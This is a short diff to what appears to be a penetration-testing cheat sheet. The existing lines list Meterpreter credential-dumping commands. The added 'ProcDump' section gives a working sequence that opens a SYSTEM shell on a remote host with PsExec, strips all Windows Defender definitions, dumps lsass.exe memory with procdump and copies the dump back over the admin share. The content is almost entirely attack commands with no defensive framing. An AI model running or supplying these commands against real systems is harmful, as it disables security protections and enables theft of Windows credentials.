@@ -59,4 +59,11 @@ getsystem
 creds_all
 lsa_dump_secrets
 lsa_dump_sam
+
+# ProcDump
+.\PsExec.exe \\jump09.ops.comply.com -i -s cmd.exe
+& "c:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+exit
+cp '\\jump09.ops.comply.com\c$\lsass.dmp' .
 ```
